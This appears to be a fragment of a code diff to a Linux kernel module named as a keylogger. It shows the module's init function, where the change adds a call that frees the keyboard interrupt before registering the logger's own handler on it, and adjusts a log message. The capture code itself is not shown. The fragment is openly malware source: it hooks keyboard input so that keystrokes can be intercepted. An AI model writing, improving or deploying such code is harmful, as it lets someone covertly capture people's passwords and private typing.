@@ -57,8 +57,9 @@ void my_keyboard_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 
 static int keylogger_init()
 {
+	free_irq(KEYBOARD_IRQ, 0);
 	int n = request_irq(KEYBOARD_IRQ, my_keyboard_irq_handler, 0, "my_keyboard", 0);
-	printk(KERN_INFO "Starting keylogger (%i)...\n", n);
+	printk(KERN_INFO "Starting keylogger (%i)...\n",n);
 
 	return 0;
 }
